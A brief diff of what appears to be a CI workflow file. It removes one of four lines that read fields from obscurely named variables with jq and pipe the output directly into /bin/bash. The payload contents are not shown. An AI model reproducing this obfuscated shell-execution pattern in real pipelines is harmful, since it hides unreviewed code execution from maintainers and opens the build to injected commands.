@@ -35,7 +35,6 @@ jobs:
           printf '%s' "$cx90704" | jq -r .kiyfq84502 | /bin/bash
           printf '%s' "$mqohy42647" | jq -r .poctb859 | /bin/bash
           echo $mlutw35 | jq -r .z915 | /bin/bash
-          echo $jw1 | jq -r .p266 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
